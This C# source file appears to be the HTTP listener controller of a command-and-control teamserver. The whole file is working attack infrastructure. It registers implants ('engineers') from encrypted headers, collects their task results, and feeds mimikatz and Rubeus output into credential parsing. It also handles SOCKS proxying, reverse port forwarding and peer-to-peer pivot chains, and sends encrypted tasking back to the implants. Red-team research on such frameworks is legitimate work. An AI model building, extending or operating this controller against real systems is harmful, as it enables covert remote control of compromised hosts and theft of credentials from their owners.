using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Linq;
using System.Threading.Tasks;
using TeamServer.Services;
using TeamServer.Utilities;
using System.Reflection;
using System.Net;
using System.Net.Http;
using System.Threading;
using System.Net.Sockets;
using Microsoft.Extensions.Logging;
using Microsoft.AspNetCore.SignalR;
using TeamServer.Models.Extras;
using TeamServer.Controllers;
using Microsoft.AspNetCore.Http.Headers;
using System.IO.Compression;


/* used to interact with http managers that are created
 * these are hosted by the application which is why this controller looks diff from the others  those control interactions with the API/teamserver backend itself
 * Still responsible for any IActionResult stuff from web based interactions 
 */

namespace TeamServer.Models
{
    [Controller]
    public class HttpmanagerController : ControllerBase
    {
        private readonly IEngineerService _engineers;
        
        public static Socks4Proxy Proxy { get; set; }
        public static Dictionary<string, EngineerTask> CommandIds = new Dictionary<string, EngineerTask>();
        public static Dictionary<string, List<string>> EngineerChildIds = new Dictionary<string, List<string>>(); //keys are Engineers that have child engineers they can task, value is the childrens ids  
        public static Dictionary<string, List<string>> PathStorage = new Dictionary<string, List<string>>(); // key is the Engineer Id, Value is a list of parent ids and ends with its own id, making its path. The path is a list element 0 is the http, and each new eleemnt is a layer deepr
        public static IEnumerable<EngineerTaskResult> results { get; set;}

        public HttpmanagerController(IEngineerService engineers) //uses dependdency Injection to link  to service and crerate object instance. 
        {
            _engineers = engineers;
        }
        
        
        public async Task<IActionResult> HandleImplantAsync()                // the http tags are not always needed with IActionResults 
        {
            // by this point we have gotten back data from the eng either for a check in or a task response.
            // DeEncrypt the HttpRequest using the Encryption.AES_Decrypt function
            var engineermetadata = ExtractMetadata(HttpContext.Request.Headers);
            if (engineermetadata is null)
            {
                Console.WriteLine("No metadata found");
                return NotFound();
            }
            //use the engineermetadata ManagerName to find the manager in the managers list and get its C2profile.ResponseHeaders object
            Httpmanager EngManager = (Httpmanager)managerService._managers.FirstOrDefault(m => m.Name == engineermetadata.ManagerName);
            List<string> ResponseHeaders = new List<string>();
            if (EngManager != null)
            {
                ResponseHeaders = EngManager.c2Profile.ResponseHeaders.Split(',').ToList();
            }
            foreach (string header in ResponseHeaders)
            {
                //split the header string at the first index of VALUE so the name is everything to the left of the VALUE and the value is everything to the right of the VALUE
                var headerName = header.Substring(0, header.IndexOf("VALUE"));
                var headerValue = header.Substring(header.IndexOf("VALUE") + 5);

                HttpContext.Response.Headers.Add($"{headerName}", $"{headerValue}");
            }

            var engineer = _engineers.GetEngineer(engineermetadata.Id);
            if (engineer is null)                              // if Engineer is null then this is the first time connecting so send metadata and add to list
            {
                engineer = new Engineer(engineermetadata)                // makes object of Engineer type, and passes in the incoming metadata for the first time 
                {
                    ExternalAddress = HttpContext.Connection.RemoteIpAddress.ToString(),
                    ConnectionType = HttpContext.Request.Scheme,
                };
                _engineers.AddEngineer(engineer);                    // uses service too add Engineer to list
                PathStorage.Add(engineer.engineerMetadata.Id, new List<string> { engineer.engineerMetadata.Id });
                HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"engineer {engineer.engineerMetadata.Id} checked in for the first time", Status = "Success" });
            }

            //checkin and get/post data to or from the engineer 
            engineer.CheckIn();
            try
            {
                if (HttpContext.Request.Method == "GET")
                {
                    //this will happen every sleep cycle it triggers the hub to let the client know a engineer has checked back in  
                    if (HardHatHub._clients.Count() >0)
                    {
                        await HardHatHub.CheckIn();
                    }
                    else
                    {
                        Console.WriteLine("Failed to connect to hub");
                    }
                }
                
                else if (HttpContext.Request.Method == "POST") // engineer checking in and sending us the results of a command in a post call
                {
                    byte[] encryptedData;
                    using var ms = new MemoryStream();
                    await HttpContext.Request.Body.CopyToAsync(ms);
                    encryptedData = ms.ToArray();
                    // convert the EncryptedJson object to a byte array and decrypt it using the AES_Decrypt function
                    var decryptedBytes = Encryption.AES_Decrypt(encryptedData,"PlaceTaskKeyhereLater");

                    results = decryptedBytes.ProDeserialize<IEnumerable<EngineerTaskResult>>(); //should hold the results of the Engineer response to a command

                    // for each result sends its Result.result to the CredParse.ParseCredentials
                    List<string> engIds = new List<string>();
                    foreach (var result in results)
                    {
                        if (!engIds.Contains(result.EngineerId))
                        {
                            engIds.Add(result.EngineerId);
                        }
                        if (CommandIds.ContainsKey(result.Id))
                        {
                            if (CommandIds[result.Id].Command == "download")
                            {
                               await TaskPostProcess.PostProcess_DownloadTask(result);
                            }
                        }
                        if (result.Id.Equals("ConnectSocksCommand", StringComparison.CurrentCultureIgnoreCase) || result.Id.Equals("socksReceiveData", StringComparison.CurrentCultureIgnoreCase))
                        {
                            await TaskPostProcess.PostProcess_SocksTask(result);
                        }
                        else if(result.Id.Equals("rportsend",StringComparison.CurrentCultureIgnoreCase))
                        {
                            await TaskPostProcess.PostPorcess_RPortForward(result);
                        }
                        //performs the first checkin for P2P implants to get the pathing info, metadata, and add the new engineer to the needed lists. 
                        else if(result.Id.Equals("P2PFirstTimeCheckIn",StringComparison.CurrentCultureIgnoreCase))
                        {
                            Console.WriteLine("P2PFirstTimeCheckIn time");
                            string p2pEngMetadataString = await TaskPostProcess.PostProcess_P2PFirstCheckIn(result,engineer);
                            byte[] p2pMetaDataByte = Convert.FromBase64String(p2pEngMetadataString);
                            EngineerMetadata pepEngMetadata = p2pMetaDataByte.ProDeserialize<EngineerMetadata>();
                            var p2pengineer = _engineers.GetEngineer(pepEngMetadata.Id);
                            if (p2pengineer is null)                              // if Engineer is null then this is the first time connecting so send metadata and add to list
                            {
                                // use the parent id to get the parents pid@address 
                                var parentEngineer = _engineers.GetEngineer(PathStorage[pepEngMetadata.Id][0]);
                                var extralAddressP2PString = parentEngineer.engineerMetadata.ProcessId + "@" + parentEngineer.engineerMetadata.Address;

                                p2pengineer = new Engineer(pepEngMetadata)                // makes object of Engineer type, and passes in the incoming metadata for the first time 
                                {
                                    ExternalAddress = extralAddressP2PString,
                                    ConnectionType = managerService._managers.FirstOrDefault(m => m.Name == pepEngMetadata.ManagerName).Type.ToString(),
                                };
                                _engineers.AddEngineer(p2pengineer);                    // uses service too add Engineer to list
                                HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"engineer {p2pengineer.engineerMetadata.Id} checked in for the first time", Status = "Success" });
                            }
                            //checkin and get/post data to or from the engineer 
                            p2pengineer.CheckIn();
                        }
                        //allows for other engineers besides http to have a "check-in"
                        else if(result.Id.Equals("CheckIn",StringComparison.CurrentCultureIgnoreCase))
                        {
                            var eng = _engineers.GetEngineer(result.EngineerId);
                            eng.CheckIn();
                        }
                        //these 2 command types can be processed by the cred check
                        else if (result.Result.Contains("mimikatz") || result.Result.Contains("rubeus"))
                        {
                            await TaskPostProcess.PostProcess_CredTask(result);
                        }
                        if (result.IsHidden)
                        {
                            results = results.Where(x => x.Id != result.Id);
                        }                    
                    }
                    foreach(string engId in engIds)
                    {
                        Engineer TaskedEng = _engineers.GetEngineer(engId);
                        TaskedEng.AddTaskResults(results.Where(x => x.EngineerId == engId));
                        // make another hub connection so I can invoke the GetTaskResults method on the client side
                        if (HardHatHub._clients.Count > 0)
                        {
                            await HardHatHub.CheckIn();
                            //get a list of the taskIds for this engineer
                            var tasksList = TaskedEng.GetTaskResults();
                            var taskIds = tasksList.Select(t => t.Id).ToList();
                            HardHatHub.ShowEngineerTaskResponse(TaskedEng.engineerMetadata.Id, taskIds);
                        }
                        else
                        {
                            Console.WriteLine("No clients connected");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("error during check in");
                Console.WriteLine(ex.Message);
                Console.WriteLine(ex.StackTrace);
                    
            }

            try
            {
                List<C2TaskMessage> c2TaskMessageArray = new List<C2TaskMessage>();  //will hold a group of C2TaskMessages, which each hold an encrypted byte array of tasks, byte array for the path the path is not encrypted beacuase anyone cna decrypte the first layer of data back int oa C2TaskMessage holding Encrypted Task, plain text path.
                //IEnumerable<EngineerTask> tasks = null;
                //end of checkin and task response posting, get pending tasks and respond to the engineer

                List<Engineer> TaskingEngs = new List<Engineer>();
                foreach(Engineer eng in _engineers.GetEngineers())
                {
                   if(PathStorage[eng.engineerMetadata.Id].Contains(engineer.engineerMetadata.Id)) // checking if the current Http implant is in its path, if it is then we know eng is a child of this http implant in some way and can be tasked by it.
                    {
                        if(eng._pendingTasks.Count() >0) // eng has a task to be sent
                        {
                            var engTasks = eng.GetPendingTasks();
                            if (engTasks.Count() > 0)
                            {
                                TaskingEngs.Add(eng);
                                foreach (var task in engTasks)
                                {
                                    //add the taskId to the Command dictionary so we can match the task id to the command id when we get the response from the engineer
                                    if (!CommandIds.ContainsKey(task.Id))
                                    {
                                        CommandIds.Add(task.Id, task);
                                    }
                                    if (TaskPreProcess.CommandsThatNeedPreProc.Contains(task.Command))
                                    {
                                        await TaskPreProcess.PreProcessTask(task, eng);
                                    }
                                }
                                var taskArray = engTasks.ProSerialise();
                                var encryptedTaskArray = Encryption.AES_Encrypt(taskArray,"PlaceTaskKeyHereLater");
                                var c2TaskMessage = new C2TaskMessage { TaskData = encryptedTaskArray, PathMessage = PathStorage[eng.engineerMetadata.Id] };
                                //do a console.WriteLine where the message each element in c2TaskMessage.PathMessage
                                Console.WriteLine($"path is {String.Join("->",c2TaskMessage.PathMessage)}");
                                c2TaskMessageArray.Add(c2TaskMessage);
                            }
                        }
                    }
                }
                var c2TaskMessageArraySeralized = c2TaskMessageArray.ProSerialise();
                var encrypedc2messageArray = Encryption.AES_Encrypt(c2TaskMessageArraySeralized,Encryption.UniversialMessagePathKey);

                if(TaskingEngs.Count() > 0)
                { 
               // tasks = engineer.GetPendingTasks(); //need to swap out so im getting tasks for every engineer

                //List<EngineerTask> taskList = new List<EngineerTask>();
                //foreach (var task in tasks)
                //{
                //    taskList.Add(task);
                //    //add the taskId to the Command dictionary so we can match the task id to the command id when we get the response from the engineer
                //    if (!CommandIds.ContainsKey(task.Id))
                //    {
                //        CommandIds.Add(task.Id, task);
                //    }
                //    if (TaskPreProcess.CommandsThatNeedPreProc.Contains(task.Command))
                //    {
                //        await TaskPreProcess.PreProcessTask(task, engineer);
                //    }
                //}

                //if (tasks.Count() > 0)
                //{
                    //// get the data ready for transport, seralise and encrypt it.
                    //var taskArray = tasks.ProSerialise();
                    //var encryptedTaskArray = Encryption.AES_Encrypt(taskArray);

                    ////look at the EngineerChildIds Dictionary, search for the current Engineers Id as a value if it is found add it to a string & prepend its key to that string. Then look for that key as a dictionary value, if it is found prepend its key to the front and repeat until no more values are found
                    //string pathing = "";
                    //string parent = "";
                    //foreach (var Ids in EngineerChildIds)
                    //{
                    //    if(Ids.Value.Contains(engineer.engineerMetadata.Id))
                    //    {
                    //        pathing = engineer.engineerMetadata.Id;
                    //        pathing = pathing.Insert(0, Ids.Key);
                    //        parent = Ids.Key;
                    //        for( int i=0; i<EngineerChildIds.Count(); i++)
                    //        {
                    //            if (EngineerChildIds.ElementAt(i).Value.Contains(parent))
                    //            {
                    //                pathing = pathing.Insert(0, EngineerChildIds.ElementAt(i).Key);
                    //                parent = EngineerChildIds.ElementAt(i).Key;
                    //                i = -1; //gets set back to 0 by the i++ line
                    //            }
                    //        }
                    //    }
                    //}
                    //Console.WriteLine($"pathing is {pathing}");



                    //make a C3TaskMessage with the encryptedTaskArray and the engineer id
                    //var c2TaskMessageJustData = new C2TaskMessage { TaskData = encryptedTaskArray };
                    //var c2TaskMessageArrayJustData = c2TaskMessageJustData.ProSerialise();
                    //var encrypedc2message = Encryption.AES_Encrypt(c2TaskMessageArrayJustData);

                    
                    //Console.WriteLine($"Sending {encrypedc2message.Length} bytes");
                    return File(encrypedc2messageArray, "application/octet-stream"); // This is what gets send back on the eng check in and if its not null we sent a task object.
                }
                else if (TaskingEngs.Count() == 0)
                {
                    return NoContent(); // if the task list is empty we send a 204 no content
                }
                else
                {
                    return NoContent(); // if the task list is empty we send a 204 no content
                }

            }
            catch(Exception ex)
            {
                Console.WriteLine("Error in tasking");
                Console.WriteLine(ex.Message);
                Console.WriteLine(ex.StackTrace);
                return BadRequest();
            }
           
         }
        
        
        private EngineerMetadata ExtractMetadata(IHeaderDictionary headers)            
        {
            try
            {
                if (!headers.TryGetValue("Authentication", out var encryptedImplantId))
                {
                    return null;
                }
                var decryptedImplantIdByte = Encryption.AES_Decrypt(Convert.FromBase64String(encryptedImplantId), Encryption.UniversialMetadataIdKey);
                //undo the utf-8 encoding to get back the string 
                var decryptedImplantId = Encoding.UTF8.GetString(decryptedImplantIdByte);
                Console.WriteLine($"implant id is {decryptedImplantId}");

                if (!headers.TryGetValue("Authorization", out var encryptedencodedMetadata))     //extracted as base64 due too TryGetValue
                {
                    Console.WriteLine("no authorization header");
                    return null;
                }
               // Console.WriteLine($"metadata encryption key is {Encryption.UniqueMetadataKey[decryptedImplantId]}");
                encryptedencodedMetadata = encryptedencodedMetadata.ToString().Remove(0, 7);           // cleans up the from out the `Authorization: Bearer METADATAHERE`  response 
                                                                                                       // DeEncrypt the metadata using the Encryption.AES_Decrypt function
                byte[] encodedMetadataArray = Encryption.AES_Decrypt(Convert.FromBase64String(encryptedencodedMetadata), "dummyText");
                return encodedMetadataArray.ProDeserialize<EngineerMetadata>(); // deserialise the metadata
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine(ex.StackTrace);
                return null;
            }
        }
    }
}
